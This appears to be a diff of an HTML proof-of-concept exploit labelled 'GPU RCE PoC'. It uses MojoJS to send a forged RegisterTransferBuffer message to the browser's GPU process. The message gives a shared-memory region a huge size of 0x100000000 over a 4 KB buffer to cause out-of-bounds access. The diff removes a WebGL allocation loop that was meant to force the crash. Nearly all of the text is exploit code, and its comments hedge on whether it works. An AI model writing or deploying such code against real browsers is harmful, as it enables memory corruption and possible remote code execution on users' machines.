@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>RegisterTransferBuffer OOB PoC (Reliable)</title>
+    <title>RegisterTransferBuffer OOB PoC</title>
 </head>
 <body>
     <h1>GPU RCE PoC</h1>
@@ -35,13 +35,9 @@
                 // Fake SharedMemoryRegion at offset 0x40
                 view.setUint32(0x40, 24, true);       // struct size
                 view.setUint32(0x44, 0, true);        // version
-                view.setUint32(0x48, 0, true);        // handle index (0 = first attached handle)
+                view.setUint32(0x48, 0, true);        // handle index (0)
                 view.setUint32(0x4C, 0, true);        // padding
-                // Use a smaller but still invalid size to force a crash on access
-                view.setBigUint64(0x50, BigInt(0x1000), true); // 4 KB, but the real buffer is also 4 KB? 
-                // Actually, the real buffer is 4 KB. Using the same size might not crash, 
-                // so we use a slightly larger size to trigger OOB on access.
-                // view.setBigUint64(0x50, BigInt(0x1001), true); // 4097 bytes → OOB
+                view.setBigUint64(0x50, BigInt(0x100000000), true); // huge size
 
                 // Attach a valid small shared buffer (4 KB)
                 const sharedBuffer = Mojo.createSharedBuffer(4096);
@@ -49,37 +45,18 @@
 
                 // 3. Send the raw message directly on the pipe
                 Mojo.writeMessage(remote.ptr.getHandle(), payload, handles);
-
-                // 4. Now actively use the corrupted buffer to trigger a crash
-                //    We'll try to use buffer ID 0x1234 as a transfer buffer.
-                //    The exact API may vary, but we can attempt to use the command buffer.
-                //    A simple way is to call gl.bufferData with a huge size, which
-                //    will try to use the corrupted transfer buffer internally.
-                //    But we need a WebGL context already created.
-                status('Malicious RegisterTransferBuffer sent! Triggering crash...');
+                status('Malicious RegisterTransferBuffer sent!');
             };
             interceptor.start();
 
-            // 5. Create a WebGL context (keep it alive)
+            // 4. Create a WebGL context to trigger CommandBuffer creation
             const canvas = document.createElement('canvas');
             const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
             if (!gl) throw new Error('WebGL not available');
 
-            // 6. Wait for the interceptor to fire, then try to cause the GPU to use the buffer
-            await new Promise(resolve => setTimeout(resolve, 500));
-
-            // 7. Force a large buffer allocation that might use the corrupted transfer buffer
-            //    The corrupted buffer ID is 0x1234. We can't directly select it, but
-            //    we can stress the GPU process with many allocations to increase the chance
-            //    of hitting the corrupted memory.
-            for (let i = 0; i < 10; i++) {
-                const buf = gl.createBuffer();
-                gl.bindBuffer(gl.ARRAY_BUFFER, buf);
-                gl.bufferData(gl.ARRAY_BUFFER, 1 << 20, gl.DYNAMIC_DRAW);
-                // This will cause the GPU process to allocate and maybe use transfer buffers.
-            }
-
-            status('Done. If no crash, refresh the page and try again.');
+            // Wait briefly for the interceptor to fire
+            await new Promise(resolve => setTimeout(resolve, 1000));
+            status('If no message appears, check the GPU process for a crash.');
         } catch (err) {
             status('Error: ' + err.message + ' (see console)');
             console.error(err);
